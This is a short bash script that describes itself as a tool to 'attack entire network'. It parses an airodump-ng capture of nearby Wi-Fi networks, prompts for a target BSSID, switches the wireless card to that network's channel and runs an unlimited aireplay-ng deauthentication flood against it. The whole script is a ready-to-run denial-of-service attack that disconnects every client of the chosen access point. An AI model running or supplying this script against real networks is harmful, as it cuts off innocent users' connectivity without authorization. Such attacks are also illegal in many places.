# Script to attack entire network
bold=$(tput bold)
normal=$(tput sgr0)

# Print out ESSIDs and BSSIDs of scanned networks and load BSSIDs and ESSIDs into an associative array
declare -A networks
declare -A channels
while IFS=, read -r bssid first last channel speed privacy cipher authentication power numBeacons numIV lanIP lenID essid key
do
	if [[ "$lanIP" = *[!\ ]* ]]; then
		if [ "$essid" != " ESSID" ]; then
			if [[ "$essid" != *[!\ ]* ]]; then
				echo "${bold}ESSID:${normal} Hidden Network ${bold}BSSID:${normal} $bssid"
			else
				echo "${bold}ESSID:${normal} $essid ${bold}BSSID:${normal} $bssid"
			fi
			networks["$bssid"]="$essid"
			channels["$bssid"]="$channel"
		fi
	fi
done < bigData-01.csv

# Check if any networks were found
if [ "${#networks[@]}" -eq 0 ]; then
	echo "No Networks Detected"
else
	# Attack a network
	# Prompt Operator for network to attack:
	invalid=true
	while $invalid; do
		read -p "Enter BSSID of Network to attack: " targetVar < /dev/tty
		for name in "${!networks[@]}"; do
			if [ $name == $targetVar ]; then
				invalid=false
			fi
		done
		if $invalid; then
			echo "Invalid BSSID entered. Try again."
		fi
	done
	echo "Attacking network $targetVar"
	# set channel to channel the targeted network is on
	targetChannel=${channels["$targetVar"]}
	# trim leading whitespace
	targetChannel=${targetChannel##*( )}
	# echo "Target Channel: $targetChannel"
	sudo iwconfig wlan0 channel $targetChannel
	# send attack to selected network
	sudo aireplay-ng --deauth 0 -a $targetVar -D wlan0
fi
